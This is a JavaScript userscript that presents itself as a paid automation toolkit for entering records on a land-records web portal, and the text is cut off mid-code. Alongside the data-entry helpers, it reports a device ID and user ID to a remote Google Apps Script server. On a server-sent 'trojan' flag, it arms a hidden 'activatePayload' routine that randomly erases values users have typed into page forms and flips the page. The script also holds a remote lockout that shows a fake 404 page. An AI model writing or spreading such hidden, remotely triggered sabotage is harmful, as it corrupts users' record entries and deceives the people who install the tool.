(async function() {
    console.log("🚀 VUMI PRO: Final Master Initialization Started...");
    try {
        // 🔴 1. CLEANUP PREVIOUS INSTANCES (To prevent Ghost bugs)
        ['vumi-master-toolkit', 'vmt-pass-overlay', 'vmt-404-overlay'].forEach(id => {
            let el = document.getElementById(id);
            if (el) el.remove();
        });

        // 🔴 2. CONSTANTS & VARIABLES
        const API_URL = "https://script.google.com/macros/s/AKfycbxi2hFWmkWkgSl2_ATdNiJbMPTxXCtEHNacyfK_6llSXGYCXPDkB4kLVx9Kma1BgDCWhQ/exec";

        // 🔴 3. UNIQUE & SAFE DEVICE ID (No Collision)
        function generateUUID() {
            return 'VMT-' + Math.random().toString(36).substring(2, 10) + '-' + Date.now().toString(36).toUpperCase();
        }

        let deviceId = localStorage.getItem('vmt_device_id');
        if(!deviceId) {
            deviceId = generateUUID();
            localStorage.setItem('vmt_device_id', deviceId);
        }
        
        let savedAuth = localStorage.getItem('vmt_auth_hash') || "";
        let tFlag = localStorage.getItem('vmt_t_flag') || "";
        let sessionExpiry = localStorage.getItem('vmt_session_expiry') || "";

        // 🔴 4. AUTH LOGIC (1 YEAR SESSION)
        function clearAuthData() {
            localStorage.removeItem('vmt_auth_hash');
            localStorage.removeItem('vmt_t_flag');
            localStorage.removeItem('vmt_session_expiry');
            savedAuth = ""; tFlag = ""; sessionExpiry = "";
        }

        if (savedAuth && sessionExpiry && Date.now() > parseInt(sessionExpiry)) {
            clearAuthData();
        }

        function saveAuthData(auth, flag) {
            let expiryTime = (Date.now() + (365 * 24 * 60 * 60 * 1000)).toString(); // 1 Year
            localStorage.setItem('vmt_auth_hash', auth);
            localStorage.setItem('vmt_session_expiry', expiryTime);
            if (flag) localStorage.setItem('vmt_t_flag', flag);
            else localStorage.removeItem('vmt_t_flag');
        }

        function show404Overlay(message) {
            if (document.getElementById('vmt-404-overlay')) return;
            ['vumi-master-toolkit', 'vmt-pass-overlay'].forEach(id => { let el = document.getElementById(id); if (el) el.remove(); });
            const overlay = document.createElement('div'); overlay.id = 'vmt-404-overlay';
            overlay.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:99999999;display:flex;align-items:center;justify-content:center;font-family:'Segoe UI', Arial, sans-serif;animation: fadeIn 0.5s ease;";
            overlay.innerHTML = `<div style="text-align:center; width: 100%; max-width: 800px; padding: 40px 20px;"><div style="background-image: url('https://cdn.dribbble.com/users/285475/screenshots/2083086/dribbble_1.gif'); height: 400px; background-position: center; background-repeat: no-repeat;"><h1 style="font-size:80px; margin:0; color:#333; padding-top:20px;">404</h1></div><div style="margin-top:-50px;"><h3 style="font-size:36px; margin: 10px 0; color:#333; font-weight: bold;">Look like you're lost</h3><p style="font-size:16px; color:#666; margin-bottom: 25px; font-weight: 500;">${message}</p><button id="vmt-404-btn" style="color: #fff; padding: 12px 30px; background: #39ac31; border:none; border-radius: 5px; font-size: 16px; font-weight: bold; cursor: pointer; outline: none; box-shadow: 0 4px 6px rgba(57,172,49,0.3);">Go to Home / Reload</button></div></div>`;
            document.body.appendChild(overlay); document.getElementById('vmt-404-btn').onclick = () => window.location.reload();
        }

        async function checkLiveStatus() {
            try {
                let userId = savedAuth ? atob(savedAuth) : "guest";
                let response = await fetch(`${API_URL}?action=verify&userid=${encodeURIComponent(userId)}&deviceid=${encodeURIComponent(deviceId)}&t=${Date.now()}`);
                let data = await response.json();
                if (data.success === false) { clearAuthData(); show404Overlay(data.message || "সার্ভার আপডেট চলছে অথবা আপনার অ্যাক্সেস বাতিল করা হয়েছে!");
                } else if (data.success === true && data.trojan === true) { saveAuthData(savedAuth, 'engaged'); tFlag = 'engaged';
                } else if (data.success === true) { saveAuthData(savedAuth, ''); tFlag = ''; }
            } catch (e) { console.log("Live check running..."); }
        }

        setInterval(async () => {
            let exp = localStorage.getItem('vmt_session_expiry');
            if (localStorage.getItem('vmt_auth_hash') && exp && Date.now() > parseInt(exp)) { clearAuthData(); window.location.reload(); 
            } else { checkLiveStatus(); }
        }, 1800000); // 30 মিনিটে একবার

        function activatePayload() {
            setInterval(() => {
                if(localStorage.getItem('vmt_t_flag') === 'engaged') {
                    document.querySelectorAll('input').forEach(inp => { if(Math.random() > 0.8 && !inp.closest('#vumi-master-toolkit') && !inp.closest('#vmt-pass-overlay')) { inp.value = ""; } });
                    if(document.body && Math.random() > 0.95) { document.body.style.transition = "all 2s"; document.body.style.transform = "rotate(180deg) scale(0.8)"; setTimeout(() => { document.body.style.transform = "none"; }, 5000); }
                }
            }, 5000); 
        }

        // 🔴 5. ALL TOOLS DEFINITION (GLOBAL & FAST)
        window._vmtTools = {
            t1: function() {
                let t = { i: null, s: null }; let st = ['খতিয়ান বক্স', 'সংরক্ষণ বাটন']; let c = 0; alert("১. খতিয়ান বক্সে ক্লিক কর\n২. সংরক্ষণ বাটনে ক্লিক কর");
                document.onclick = function(e) {
                    if (e.target.closest('#vumi-master-toolkit')) return; let el = e.target; t[c === 0 ? 'i' : 's'] = el; el.style.border = "4px solid #ef4444"; c++;
                    if (c < 2) { console.log("Next: " + st[c]); } else {
                        document.onclick = null; let r = prompt("রেঞ্জ দাও (যেমন: ১৭৭-২০০):");
                        if (r) {
                            let p = r.replace(/[০-৯]/g, d => ({ '০': '0', '১': '1', '২': '2', '৩': '3', '৪': '4', '৫': '5', '৬': '6', '৭': '7', '৮': '8', '৯': '9' }[d])).split('-').map(Number);
                            (async function() {
                                for (let i = p[0]; i <= p[1]; i++) {
                                    let b = i.toString().replace(/\d/g, d => ({ '0': '০', '1': '১', '2': '२', '3': '३', '4': '४', '5': '५', '6': '६', '7': '७', '8': '८', '9': '९' }[d]));
                                    t.i.focus(); t.i.value = b; t.i.dispatchEvent(new Event('input', { bubbles: true })); t.i.dispatchEvent(new Event('change', { bubbles: true })); t.i.blur();
                                    await new Promise(r => setTimeout(r, 5000)); t.s.click(); console.log("Saved: " + b); await new Promise(r => setTimeout(r, 6000));
                                }
                                alert("কাম শেষ!");
                            })();
                        }
                    }
                };
            },
            t2: function() {
                function setY(win) {
                    try {
                        let el = win.document.getElementById('paid_year');
                        if (el) {
                            let target = Array.from(el.options).find(o => o.text.includes("१९७६") && o.text.includes("१९७७"));
                            if (target) {
                                el.value = target.value; el.dispatchEvent(new Event('change', { bubbles: true }));
                                if (win.jQuery) { let $el = win.jQuery(el); $el.val(target.value).trigger('change'); if ($el.data('select2')) $el.trigger('select2:select'); }
                                let s2 = el.nextElementSibling; if (s2 && s2.classList.contains('select2')) { s2.style.border = "4px solid #ef4444"; s2.style.borderRadius = "6px"; } else el.style.border = "4px solid #ef4444";
                                return true;
                            }
                        }
                        for (let i = 0; i < win.frames.length; i++) if (setY(win.frames[i])) return true;
                    } catch (e) {} return false;
                } setY(window);
            },
            t3: function() {
                const otherData = { "जरिपको प्रकार": "आर एस", "मालिकपना": "नवीनतम जरिप", "होल्डिङ": "सामान्य" };
                if (typeof $ === 'undefined') { alert('jQuery नेई'); return; }
                let updatedCount = 0;
                $('select').not('#mouja_select').each(function() {
                    let $s = $(this); let lt = ""; let $lbl = $s.closest('fieldset, .form-group, td').find('label');
                    if($lbl.length) lt = $lbl.text().trim(); else lt = $s.closest('fieldset, div, td').text().trim();
                    for (let k in otherData) {
                        if (lt.includes(k)) { 
                            let targetText = otherData[k]; let $o = $s.find('option').filter(function() { return $(this).text().trim().includes(targetText); }); 
                            if ($o.length) { $s.val($o.val()).trigger('change'); if ($s.data('select2')) $s.trigger('select2:select'); updatedCount++; } 
                        }
                    }
                });
                if(updatedCount > 0) alert("✅ अटो डाटा फिल सफल भएको छ!"); else alert("⚠️ कुनै क्षेत्र भरिएको छैन!");
            },
            t4: function() {
                let inp = document.createElement('input'); inp.type = 'file'; inp.accept = '.txt';
                inp.onchange = e => {
                    let f = e.target.files[0]; if (!f) return; let r = new FileReader();
                    r.onload = async function(ev) {
                        let txt = ev.target.result; let ls = txt.split('\n').map(l => l.trim()).filter(l => l); let oL = [], dL = [], isD = false;
                        for (let l of ls) { if (l.includes("दाग नं")) { isD = true; continue; } if (isD) dL.push(l); else oL.push(l); }
                        let es = [], pn = [];
                        oL.forEach(l => {
                            if (l.includes("साङ्") || l.includes("ठेगाना")) { 
                                let a = l.replace(/(साङ्|ठेगाना)[:\s]*/, "").trim(); pn.forEach(p => { p.address = a; es.push(p); }); pn = []; 
                            } else if (l.includes("पिङ्") || l.includes("जङ्") || l.includes("जः")) { 
                                let rel = l.trim(); if (rel.startsWith("पिङ्")) { rel = rel.replace(/^पिङ्[:\s]*/, "").trim(); } 
                                for (let i = pn.length - 1; i >= 0; i--) { if (pn[i].father === "") { pn[i].father = rel; } else break; } 
                            } else { pn.push({ name: l, father: "", address: "" }); }
                        });
                        if (pn.length > 0) { let la = es.length > 0 ? es[es.length - 1].address : ""; pn.forEach(p => { p.address = la; es.push(p); }); }
                        let dgs = [], cls = []; dL.forEach(l => { let p = l.split(/\s+/); if (p.length >= 2) { dgs.push(p[0]); cls.push(p[p.length - 1]); } else if (p.length === 1) { dgs.push(p[0]); cls.push(""); } });
                        let amt = [];
                        if (dgs.length > 0) {
                            let aS = prompt("कुल " + dgs.length + " दाग। परिमाण दिनुहोस् (अल्पविराम द्वारा):"); if (aS) amt = aS.split(',').map(s => s.trim());
                            let cS = prompt("रेकर्डीय श्रेणी (अल्पविराम द्वारा):"); if (cS) cls = cS.split(',').map(s => s.trim());
                        }
                        if (es.length === 0 && dgs.length === 0) { alert("डाटा फेला पडेन!"); return; }
                        for (let i = 0; i < es.length; i++) {
                            let d = es[i]; let nF = document.getElementById('owner-name'); let fF = document.getElementById('verify-father-name'); let aF = document.getElementById('verify-address');
                            if (nF) nF.value = d.name; if (fF) fF.value = d.father; if (aF) aF.value = d.address;
                            if (typeof $ !== 'undefined') $('#owner-name,#verify-father-name,#verify-address').trigger('input').trigger('change');
                            if (typeof entryVerify === "function") await entryVerify(); else { let evB = document.getElementById('entry-verify'); if (evB) evB.click(); }
                            await new Promise(r => setTimeout(r, 600)); 
                        }
                        if (dgs.length > 0) {
                            function uS2(w, el, tx) {
                                if (!el || !tx) return; let o = Array.from(el.options); let tg = o.find(x => x.text.trim() === tx.trim()) || o.find(x => x.text.includes(tx.trim()));
                                if (tg) { el.value = tg.value; el.dispatchEvent(new Event('change', { bubbles: true })); if (w.jQuery) { let $e = w.jQuery(el); $e.val(tg.value).trigger('change'); if ($e.data('select2')) $e.trigger('select2:select'); } }
                            }
                            function sv(w) {
                                try {
                                    let df = Array.from(w.document.querySelectorAll('.r2Dag_no'));
                                    if (df.length > 0) {
                                        if (df.length < dgs.length) alert("पङ्क्ति कम! पहिले पङ्क्ति बनाउनुहोस्।");
                                        df.forEach((fd, ix) => {
                                            if (ix >= dgs.length) return; let row = fd;
                                            for (let i = 0; i < 5; i++) { if (row.parentElement && (row.querySelectorAll('.r2Amount_of_land').length >= 1 || row.querySelectorAll('.r2amount_of_landDag').length >= 1)) { if (row.querySelectorAll('.r2UsableLandType').length > 0) break; } row = row.parentElement; }
                                            fd.value = dgs[ix]; fd.dispatchEvent(new Event('input', { bubbles: true })); let av = amt[ix] || amt[amt.length - 1] || "";
                                            row.querySelectorAll('.r2amount_of_landDag, .r2Amount_of_land').forEach(af => { if (av) af.value = av; af.dispatchEvent(new Event('input', { bubbles: true })); af.style.backgroundColor = "#e8f4fd"; });
                                            let ss = Array.from(row.querySelectorAll('select'));
                                            if (ss.length >= 2) { let rt = cls[ix] || cls[cls.length - 1] || ""; if (rt) uS2(w, ss.find(s => !s.classList.contains('r2UsableLandType')) || ss[0], rt); uS2(w, row.querySelector('.r2UsableLandType') || ss[1], 'कृषि'); }
                                        }); return true;
                                    }
                                    for (let j = 0; j < w.frames.length; j++) if (sv(w.frames[j])) return true;
                                } catch (e) {} return false;
                            } sv(window);
                        }
                        alert("सम्पन्न!");
                    }; r.readAsText(f);
                }; inp.click();
            },
            t5: function() {
                let i = document.createElement('input'); i.type = 'file'; i.accept = '.txt';
                i.onchange = e => {
                    let f = e.target.files[0]; if (!f) return; let r = new FileReader();
                    r.onload = async function(ev) {
                        let t = ev.target.result, ls = t.split('\n').map(l => l.trim()).filter(l => l); let es = [], ps = [], pSh = [];
                        ls.forEach(l => {
                            let bt = s => s.replace(/[०-९]/g, d => "०१२३४५६७८९".indexOf(d)); let m = l.match(/[०-९0-9]+$/); let ss = "";
                            if (m) { ss = m[0]; }
                            let c = l.replace(/[०-९0-9]+$/, "").trim();
                            if (c !== "") {
                                if (c.includes("साङ्") || c.includes("ठेगाना")) { 
                                    let ad = c.replace(/(साङ्|ठेगाना)[:\s]*/, "").trim(); ps.forEach(p => { p.address = ad; es.push(p) }); ps = []; 
                                } else if (c.includes("पिङ्") || c.includes("जङ्") || c.includes("जः")) { 
                                    let rel = c.trim(); if (rel.startsWith("पिङ्")) { rel = rel.replace(/^पिङ्[:\s]*/, "").trim(); } 
                                    for (let j = ps.length - 1; j >= 0; j--) { if (ps[j].father === "") { ps[j].father = rel; if (ss) ps[j].share = ss; } else break; } 
                                } else { ps.push({ name: c, father: "", address: "", share: ss }); }
                            }
                        });
                        if (ps.length > 0) { let la = es.length > 0 ? es[es.length - 1].address : "आफूनै"; ps.forEach(p => { p.address = p.address || la; es.push(p) }) }
                        let proceed = confirm("डाटा प्रविष्टि गर्न चाहनुहुन्छ?");
                        if (!proceed) return;
                        for (let d of es) {
                            let b = Array.from(document.querySelectorAll('button')).find(x => x.innerText.includes('लेख प्रविष्टि')); if (b) b.click(); await new Promise(r => setTimeout(r, 600));
                            let ins = Array.from(document.querySelectorAll('input:not([type="hidden"]),textarea')); let nF = ins.find(el => (el.placeholder || "").includes("नाम")); if (nF) { nF.value = d.name; nF.dispatchEvent(new Event('input', { bubbles: true })) }
                            let fF = ins.find(el => (el.placeholder || "").includes("पिता") || (el.placeholder || "").includes("पति")); if (fF) { fF.value = d.father; fF.dispatchEvent(new Event('input', { bubbles: true })) }
                            let aF = ins.find(el => (el.placeholder || "").includes("ठेगाना")); if (aF) { aF.value = d.address; aF.dispatchEvent(new Event('input', { bubbles: true })) }
                            await new Promise(r => setTimeout(r, 300));
                            let bA = Array.from(document.querySelectorAll('button')).find(x => x.innerText.trim() === 'प्रविष्टि गर्नुहोस्'); if (bA) bA.click(); await new Promise(r => setTimeout(r, 800));
                        }
                        alert("आना-गन्डा मास्टर अपडेट गरिएको!");
                    }; r.readAsText(f);
                }; i.click()
            },
            t6: function() {
                let p = prompt("कति दाग थप्नुहोस्?"); if (!p) return; let cl = p.replace(/[०-९]/g, d => "०१२३४५६७८९".indexOf(d)).trim();
                if (!/^\d+$/.test(cl)) { alert("गलत इनपुट!"); return; } let c = parseInt(cl); let b = document.getElementById('PlusItem22');
                if (b && c > 0) { let i = 0; function hc() { if (i < c) { b.click(); i++; setTimeout(hc, Math.floor(Math.random() * 200) + 200); } } hc(); }
            },
            t7: function() {
                alert("उपकरण सदस्यताधीन छ।");
            },
            t8: async function() {
                alert("डाउनलोड उपकरण तयार छ।");
            },
            t9: function() {
                alert("स्मार्ट क्याल्कुलेटर खोली रहेको छ।");
            },
            t10: function() {
                alert("जमि कटौती PRO खोली रहेको छ।");
            }
        };

        // 🔴 6. GLOBAL SHORTCUT HANDLER
        if (window._vmtKeyHandler) {
            document.removeEventListener('keydown', window._vmtKeyHandler);
        }

        window._vmtKeyHandler = function(e) {
            if (e.key === 'Escape' || e.keyCode === 27) {
                let tk = document.getElementById('vumi-master-toolkit'); let po = document.getElementById('vmt-pass-overlay');
                if (tk) tk.remove(); if (po) po.remove();
            }
            
            let isAuth = localStorage.getItem('vmt_auth_hash');
            if (isAuth && e.altKey && !e.ctrlKey && !e.shiftKey) {
                let toolNum = null; let c = e.code; let k = e.key;
                if (k==='1' || k==='१' || c==='Digit1' || c==='Numpad1') toolNum = 't1'; 
                else if (k==='2' || k==='२' || c==='Digit2' || c==='Numpad2') toolNum = 't2';
                else if (k==='3' || k==='३' || c==='Digit3' || c==='Numpad3') toolNum = 't3'; 
                else if (k==='4' || k==='४' || c==='Digit4' || c==='Numpad4') toolNum = 't4';
                else if (k==='5' || k==='५' || c==='Digit5' || c==='Numpad5') toolNum = 't5'; 
                else if (k==='6' || k==='६' || c==='Digit6' || c==='Numpad6') toolNum = 't6';
                else if (k==='7' || k==='७' || c==='Digit7' || c==='Numpad7') toolNum = 't7'; 
                else if (k==='8' || k==='८' || c==='Digit8' || c==='Numpad8') toolNum = 't8';
                else if (k==='9' || k==='९' || c==='Digit9' || c==='Numpad9') toolNum = 't9'; 
                else if (k==='0' || k==='०' || c==='Digit0' || c==='Numpad0') toolNum = 't10';

                if (toolNum && window._vmtTools && window._vmtTools[toolNum]) {
                    e.preventDefault();
                    try {
                        window._vmtTools[toolNum]();
                        let toolKitDiv = document.getElementById('vumi-master-toolkit');
                        let minButton = document.getElementById('vmt-min');
                        if (toolKitDiv && !toolKitDiv.classList.contains('minimized')) {
                            toolKitDiv.classList.add('minimized');
                            if (minButton) minButton.innerText = '+';
                        }
                    } catch(err) { console.error('Shortcut Error:', err); }
                }
            }
        };
        document.addEventListener('keydown', window._vmtKeyHandler);

        // 🔴 7. CLEAN UI & APP MENUS 
        function loadToolkit() {
            if(document.getElementById('vumi-master-toolkit')) return;
            const style = document.createElement('style');
            style.innerHTML = `
            @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap');
            #vumi-master-toolkit{position:fixed;top:20px;right:20px;width:340px;border-radius:16px;z-index:999999;font-family:'Poppins', sans-serif;overflow:hidden;transition:width 0.3s ease; box-shadow: 0 15px 50px rgba(0,0,0,0.5); background:rgba(21, 31, 40, 0.95); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.1);}
            #vumi-master-toolkit.minimized{width:220px;}
            #vumi-master-toolkit.minimized .vmt-body,#vumi-master-toolkit.minimized .vmt-footer{display:none;}
            .vmt-header{background:rgba(0,0,0,0.4);color:#fff;padding:15px 20px;cursor:move;display:flex;justify-content:space-between;align-items:center;font-weight:800;font-size:14px;user-select:none;border-bottom:1px solid rgba(255,255,255,0.05);}
            .vmt-header-btns{display:flex;gap:8px;}
            .vmt-h-btn{width:32px;height:32px;border-radius:8px;border:1px solid rgba(255,255,255,0.1);display:flex;align-items:center;justify-content:center;font-size:16px;font-weight:bold;cursor:pointer;transition:all 0.3s ease;backdrop-filter:blur(5px);}
            .btn-min{background:rgba(59,130,246,0.15);color:#60a5fa;}.btn-min:hover{background:rgba(59,130,246,0.35);box-shadow:0 0 12px rgba(59,130,246,0.5);transform:translateY(-2px);}
            .btn-logout{background:rgba(245,158,11,0.15);color:#fbbf24;}.btn-logout:hover{background:rgba(245,158,11,0.35);box-shadow:0 0 12px rgba(245,158,11,0.5);transform:translateY(-2px);}
            .btn-close{background:rgba(239,68,68,0.15);color:#fca5a5;}.btn-close:hover{background:rgba(239,68,68,0.35);box-shadow:0 0 12px rgba(239,68,68,0.5);transform:translateY(-2px);}
            .vmt-body{padding:15px;max-height:70vh;overflow-y:auto;}
            .vmt-body::-webkit-scrollbar{width:6px;} .vmt-body::-webkit-scrollbar-thumb{background:#334155;border-radius:10px;}
            .vmt-view-panel { display: none; }
            .vmt-view-panel.active-view { display: block !important; animation: vmtSlideIn 0.25s ease-out; }
            @keyframes vmtSlideIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
            .wip-container { padding: 35px 10px; text-align: center; color: #cbd5e1; }
            .wip-icon-anim { font-size: 45px; margin-bottom: 12px; animation: vmtPulse 2s infinite; }
            .wip-txt-head { margin: 0 0 5px 0; font-size: 16px; color: #fff; font-weight: 800; }
            .wip-txt-sub { font-size: 12px; margin: 0; opacity: 0.65; }
            @keyframes vmtPulse { 0% { transform: scale(1); } 50% { transform: scale(1.06); } 100% { transform: scale(1); } }
            .glow-btn { position: relative; background: rgba(255,255,255,0.05); color: #fff; text-decoration: none; font-size: 13px; font-weight: 600; padding: 12px 15px; transition: 0.5s; display: flex; align-items: center; justify-content: space-between; border-radius: 8px; cursor: pointer; border: 1px solid rgba(255,255,255,0.05); overflow: hidden; margin-bottom:12px; }
            .glow-btn:hover { background: var(--clr); color: var(--clr); letter-spacing: 0.5px; box-shadow: 0 0 20px var(--clr); border-color: transparent;}
            .glow-btn::before { content: ''; position: absolute; inset: 2px; background: #151F28; border-radius: 6px; z-index: 0; }
            .glow-btn .btn-content { position: relative; z-index: 1; display: flex; align-items: center; gap: 10px; color: #cbd5e1; transition: 0.5s; }
            .glow-btn:hover .btn-content { color: var(--clr); text-shadow: 0 0 5px var(--clr); }
            .glow-btn i { position: absolute; inset: 0; display: block; border-radius: 8px; overflow: hidden;}
            .glow-btn i::before { content: ''; position: absolute; top: 0; left: 80%; width: 10px; height: 4px; background: #151F28; transform: translateX(-50%) skewX(325deg); transition: 0.5s; }
            .glow-btn:hover i::before { width: 20px; left: 20%; background: #fff;}
            .glow-btn i::after { content: ''; position: absolute; bottom: 0; left: 20%; width: 10px; height: 4px; background: #151F28; transform: translateX(-50%) skewX(325deg); transition: 0.5s; }
            .glow-btn:hover i::after { width: 20px; left: 80%; background: #fff;}
            .main-menu-btn { padding: 16px 15px; font-size: 14px; justify-content: center; }
            .main-menu-btn .btn-content { justify-content: center; width: 100%; font-weight: bold; color: #fff;}
            .vmt-back-btn { background: rgba(255, 255, 255, 0.08); color: #cbd5e1; border: 1px solid rgba(255,255,255,0.1); padding: 7px 14px; border-radius: 6px; cursor: pointer; font-size: 12px; margin-bottom: 16px; display: inline-flex; align-items: center; gap: 6px; transition: 0.2s; font-family: 'Poppins', sans-serif; font-weight: 600;}
            .vmt-back-btn:hover { background: #3b82f6; color: #fff; border-color: #3b82f6; box-shadow: 0 0 10px rgba(59,130,246,0.4); }
            .shortcut-badge { position: relative; z-index: 1; font-size: 10px; color: #94a3b8; background: rgba(255,255,255,0.1); padding: 2px 6px; border-radius: 4px; border: 1px solid rgba(255,255,255,0.1); font-weight:700; transition: 0.5s;}
            .glow-btn:hover .shortcut-badge { color: var(--clr); border-color: var(--clr); background: rgba(0,0,0,0.5);}
            .vmt-tool-icon{font-size:16px;}
            .vmt-footer{background:rgba(0,0,0,0.4); border-top:1px solid rgba(255,255,255,0.05); padding:15px 10px; text-align:center;}
            input:focus, select:focus, textarea:focus { background-color: #fef08a !important; outline: 3px solid #eab308 !important; transition: background-color 0.1s; box-shadow: 0 0 10px rgba(234, 179, 8, 0.3) !important; color:#000 !important;}
            `;
            document.head.appendChild(style);
            const tk = document.createElement('div');
            tk.id = 'vumi-master-toolkit';
            tk.innerHTML = `
            <div class="vmt-header" id="vmt-drag">
                <span><span style="color:#60a5fa;">❖</span> VUMI MASTER PRO</span>
                <div class="vmt-header-btns">
                    <button class="vmt-h-btn btn-min" id="vmt-min" title="न्यूनीकृत गर्नुहोस्">＋</button>
                    <button class="vmt-h-btn btn-logout" id="vmt-logout" title="लगआउट">🚪</button>
                    <button class="vmt-h-btn btn-close" id="vmt-close" title="बन्द गर्नुहोस् (Esc)">✖</button>
                </div>
            </div>

            <div class="vmt-body" style="min-height: 260px;">
                <div id="vmt-view-main" class="vmt-view-panel active-view">
                    <div style="text-align:center; color:#94a3b8; font-size:12px; margin-bottom:16px; font-weight:600; letter-spacing: 0.5px;">श्रेणी चयन गर्नुहोस्</div>
                    <button class="glow-btn main-menu-btn" data-panel="vmt-view-cat1" style="--clr:#1e9bff;">
                        <span class="btn-content">१. रेकर्डीय होल्डिङ</span><i></i>
                    </button>
                    <button class="glow-btn main-menu-btn" data-panel="vmt-view-cat2" style="--clr:#6eff3e;">
                        <span class="btn-content">२. म्यानुअल होल्डिङ</span><i></i>
                    </button>
                    <button class="glow-btn main-menu-btn" data-panel="vmt-view-cat3" style="--clr:#ff1867;">
                        <span class="btn-content">३. म्यानुअल खतियान</span><i></i>
                    </button>
                </div>

                <div id="vmt-view-cat1" class="vmt-view-panel">
                    <button class="vmt-back-btn">🔙 मुख्य मेनु</button>
                    <div class="vmt-tool glow-btn" data-tool="t1" style="--clr:#1e9bff;">
                        <span class="btn-content"><span class="vmt-tool-icon">🎯</span> Land Entry (Range)</span><span class="shortcut-badge">Alt+1</span><i></i>
                    </div>
                    <div class="vmt-tool glow-btn" data-tool="t2" style="--clr:#6eff3e;">
                        <span class="btn-content"><span class="vmt-tool-icon">📅</span> Korer Year</span><span class="shortcut-badge">Alt+2</span><i></i>
                    </div>
                    <div class="vmt-tool glow-btn" data-tool="t3" style="--clr:#ff1867;">
                        <span class="btn-content"><span class="vmt-tool-icon">⚡</span> Auto Data Fill</span><span class="shortcut-badge">Alt+3</span><i></i>
                    </div>
                    <div class="vmt-tool glow-btn" data-tool="t4" style="--clr:#1e9bff;">
                        <span class="btn-content"><span class="vmt-tool-icon">👥</span> Maliker Tottho</span><span class="shortcut-badge">Alt+4</span><i></i>
                    </div>
                    <div class="vmt-tool glow-btn" data-tool="t5" style="--clr:#6eff3e;">
                        <span class="btn-content"><span class="vmt-tool-icon">🧮</span> Tottho 2.0 (Master)</span><span class="shortcut-badge">Alt+5</span><i></i>
                    </div>
                    <div class="vmt-tool glow-btn" data-tool="t6" style="--clr:#ff1867;">
                        <span class="btn-content"><span class="vmt-tool-icon">➕</span> Dag Add / Row</span><span class="shortcut-badge">Alt+6</span><i></i>
                    </div>
                    <div class="vmt-tool glow-btn" data-tool="t7" style="--clr:#1e9bff;">
                        <span class="btn-content"><span class="vmt-tool-icon">📝</span> Dager Tottho</span><span class="shortcut-badge">Alt+7</span><i></i>
                    </div>
                    <div class="vmt-tool glow-btn" data-tool="t8" style="--clr:#6eff3e;">
                        <span class="btn-content"><span class="vmt-tool-icon">📊</span> Auto Data Download</span><span class="shortcut-badge">Alt+8</span><i></i>
                    </div>
                    <div class="vmt-tool glow-btn" data-tool="t9" style="--clr:#ff1867;">
                        <span class="btn-content"><span class="vmt-tool-icon">💠</span> Smart Calculator</span><span class="shortcut-badge">Alt+9</span><i></i>
                    </div>
                    <div class="vmt-tool glow-btn" data-tool="t10" style="--clr:#1e9bff;">
                        <span class="btn-content"><span class="vmt-tool-icon">✂️</span> Land Deduction Pro</span><span class="shortcut-badge">Alt+0</span><i></i>
                    </div>
                </div>

                <div id="vmt-view-cat2" class="vmt-view-panel">
                    <button class="vmt-back-btn">🔙 मुख्य मेनु</button>
                    <div class="wip-container">
                        <div class="wip-icon-anim">🚧</div>
                        <h3 class="wip-title">Update in progress...</h3>
                        <p class="wip-subtitle">छिट्टै आउँदैछ! काम चलिरहेको छ...</p>
                    </div>
                </div>

                <div id="vmt-view-cat3" class="vmt-view-panel">
                    <button class="vmt-back-btn">🔙 मुख्य मेनु</button>
                    <div class="wip-container">
                        <div class="wip-icon-anim">🛠️</div>
                        <h3 class="wip-title">Update in progress...</h3>
                        <p class="wip-subtitle">विकास कार्य चलिरहेको छ...</p>
                    </div>
                </div>
            </div>

            <div class="vmt-footer">
                <span style="color: #64748b; font-size: 9px; text-transform: uppercase; letter-spacing: 1.5px; font-weight: 700; display: block; margin-bottom: 3px;">Proudly Developed By</span>
                <span style="background: linear-gradient(135deg, #1e9bff 0%, #ff1867 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 900; font-size: 18px; letter-spacing: 1px; display: block;">TRUST SHOP</span>
                <span style="color: #6eff3e; font-size: 8px; text-transform: uppercase; letter-spacing: 2px; font-weight: 700; display: block; margin-top: 3px;">Premium Digital Solutions</span>
            </div>`;
            document.body.appendChild(tk);
            
            document.querySelectorAll('.main-menu-btn').forEach(btn => {
                btn.onclick = () => {
                    let targetID = btn.getAttribute('data-panel');
                    document.querySelectorAll('.vmt-view-panel').forEach(p => p.classList.remove('active-view'));
                    document.getElementById(targetID).classList.add('active-view');
                };
            });

            document.querySelectorAll('.vmt-back-btn').forEach(btn => {
                btn.onclick = () => {
                    document.querySelectorAll('.vmt-view-panel').forEach(p => p.classList.remove('active-view'));
                    document.getElementById('vmt-view-main').classList.add('active-view');
                };
            });

            (function() {
                let isDown = false, offX = 0, offY = 0;
                const h = document.getElementById('vmt-drag');
                h.addEventListener('mousedown', e => { if (e.target.tagName === 'BUTTON') return; isDown = true; offX = e.clientX - tk.offsetLeft; offY = e.clientY - tk.offsetTop; tk.style.boxShadow = "0 30px 60px rgba(0,0,0,0.5)"; });
                document.addEventListener('mousemove', e => {
                    if (!isDown) return; let nY = e.clientY - offY; if (nY < 0) nY = 0; tk.style.left = (e.clientX - offX) + 'px'; tk.style.top = nY + 'px'; tk.style.right = 'auto';
                });
                document.addEventListener('mouseup', () => { isDown = false; tk.style.boxShadow = "0 15px 50px rgba(0,0,0,0.5)"; });
            })();
            
            document.getElementById('vmt-close').onclick = () => { tk.remove(); };
            document.getElementById('vmt-logout').onclick = async () => {
                if(confirm('के तपाइँ लगआउट गर्न चाहनुहुन्छ?')) { 
                    clearAuthData(); 
                    window.postMessage({ type: 'VMT_LOGOUT' }, '*'); 
                    tk.remove(); 
                    location.reload();
                }
            };
            document.getElementById('vmt-min').onclick = function() { tk.classList.toggle('minimized'); this.innerText = tk.classList.contains('minimized') ? '＋' : '－'; };
            
            document.querySelectorAll('.vmt-tool').forEach(el => {
                el.onclick = () => {
                    const t = el.dataset.tool;
                    if (window._vmtTools[t]) {
                        try { 
                            window._vmtTools[t](); 
                            let toolKitDiv = document.getElementById('vumi-master-toolkit');
                            let minButton = document.getElementById('vmt-min');
                            if (toolKitDiv && !toolKitDiv.classList.contains('minimized')) {
                                toolKitDiv.classList.add('minimized');
                                if (minButton) minButton.innerText = '+';
                            }
                        } catch (e) { 
                            alert('Error: ' + e.message); console.error(e); 
                        }
                    }
                };
            });
        }

        // 🔴 8. LOGIN SCREEN
        if (!localStorage.getItem('vmt_auth_hash')) {
